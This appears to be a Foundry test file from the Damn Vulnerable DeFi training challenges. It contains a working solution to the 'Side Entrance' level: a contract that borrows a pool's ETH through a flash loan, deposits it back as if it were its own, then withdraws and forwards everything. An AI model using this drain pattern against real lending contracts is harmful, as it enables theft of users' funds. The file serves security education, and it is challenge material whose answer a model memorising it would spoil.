// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     * @notice Main test
     * @dev Deploys RescueContract, drains the pool using a flash loan + deposit trick, then withdraws the funds and forwards them to the recovery account.
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        RescueContract rescueContract = new RescueContract(pool, recovery);
        rescueContract.rescue(ETHER_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

contract RescueContract {
    SideEntranceLenderPool immutable i_pool;
    address immutable i_recovery;

    event RescueContract__SuccessfullyRescued(address recovery);

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        i_pool = _pool;
        i_recovery = _recovery;
    }

    /// @notice Starts the rescue by taking out a flash loan
    function rescue(uint256 amount) external {
        i_pool.flashLoan(amount);
        i_pool.withdraw();
    }

    /// @notice Called during flash loan, instantly deposits ETH back into the pool
    function execute() external payable {
        i_pool.deposit{value: msg.value}();
    }

    /// @notice Receives ETH from withdraw and forwards to recovery account
    receive() external payable {
        (bool success, ) = payable(i_recovery).call{value: msg.value}("");

        if (success) {
            emit RescueContract__SuccessfullyRescued(i_recovery);
        }
    }
}
